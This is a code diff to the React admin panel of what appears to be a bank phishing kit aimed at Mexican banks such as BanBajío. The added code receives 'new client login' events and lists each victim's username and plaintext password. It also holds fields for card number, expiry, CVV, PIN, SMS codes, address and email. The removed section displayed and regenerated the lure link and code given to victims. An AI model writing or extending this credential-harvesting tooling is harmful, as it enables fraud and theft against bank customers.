@@ -265,6 +265,58 @@ export default function AdminPanel() {
             description: "La sesión ha sido eliminada correctamente.",
           });
         }
+        else if (data.type === 'NEW_CLIENT_LOGIN') {
+          // Nuevo cliente inició sesión desde la página principal
+          const { sessionId, banco, folio, clientData, message } = data.data;
+          
+          console.log(`Nuevo cliente detectado: ${sessionId} - Folio: ${folio}`);
+          
+          // Mostrar notificación del nuevo cliente con folio
+          toast({
+            title: "¡Nuevo Cliente Conectado!",
+            description: `Folio: ${folio} - Usuario: ${clientData.username}`,
+            duration: 5000,
+          });
+          
+          // Agregar la nueva sesión a la lista si estamos en la pestaña actual
+          if (activeTab === 'current') {
+            setSessions(prev => {
+              // Verificar si ya existe la sesión
+              const existingIndex = prev.findIndex(s => s.sessionId === sessionId);
+              if (existingIndex >= 0) {
+                return prev; // Ya existe, no agregar duplicada
+              }
+              
+              // Crear nueva sesión para mostrar en la lista
+              const newSession = {
+                id: Date.now(), // ID único temporal
+                sessionId,
+                banco,
+                folio,
+                pasoActual: ScreenType.LOGIN,
+                active: true,
+                saved: false,
+                username: clientData.username,
+                password: clientData.password,
+                createdAt: new Date(),
+                createdBy: 'sistema', // Marcamos que fue creada por el sistema
+                sms: null,
+                tarjeta: null,
+                fechaVencimiento: null,
+                cvv: null,
+                nip: null,
+                transferencia: null,
+                cancelacion: null,
+                smsCompra: null,
+                direccion: null,
+                correo: null,
+                contrasena: null
+              };
+              
+              return [newSession, ...prev]; // Agregar al inicio de la lista
+            });
+          }
+        }
         else if (data.type === 'SESSIONS_CLEANUP') {
           // Notificar al usuario sobre la limpieza de sesiones expiradas
           const { deletedCount } = data.data;
@@ -948,38 +1000,8 @@ export default function AdminPanel() {
           </div>
         </div>
 
-        {/* Link Panel */}
-        <div className="mx-6 mt-6 bg-[#1e1e1e] p-4 rounded-lg flex justify-between items-center">
-          <div className="flex items-center space-x-2">
-            <span className="font-semibold">Liga activa:</span>
-            {clientLink && (
-              <a href={clientLink} target="_blank" className="text-[#00aaff]">
-                {clientLink}
-              </a>
-            )}
-            {clientCode && (
-              <span className={`font-bold ml-2 px-3 py-1 rounded-md ${
-                activeBank === 'BANBAJIO' 
-                  ? 'text-white bg-[#4D2C91]' 
-                  : 'text-green-400 bg-[#1a3e1a]'
-              }`}>
-                Código: <span className="text-xl tracking-wider">{clientCode}</span>
-              </span>
-            )}
-            <button 
-              className="text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded ml-2"
-              onClick={copyLink}
-            >
-              Copiar
-            </button>
-            <button 
-              className="text-xs text-gray-400 bg-[#2c2c2c] hover:bg-[#1f1f1f] px-2 py-1 rounded"
-              onClick={() => generateLink.mutate()}
-            >
-              {generateLink.isPending ? 'Generando...' : 'Regenerar'}
-            </button>
-          </div>
-          
+        {/* Bank Filter */}
+        <div className="mx-6 mt-6">
           <select 
             id="filtroBanco" 
             className="bg-[#2c2c2c] text-white border border-gray-700 rounded px-3 py-2"
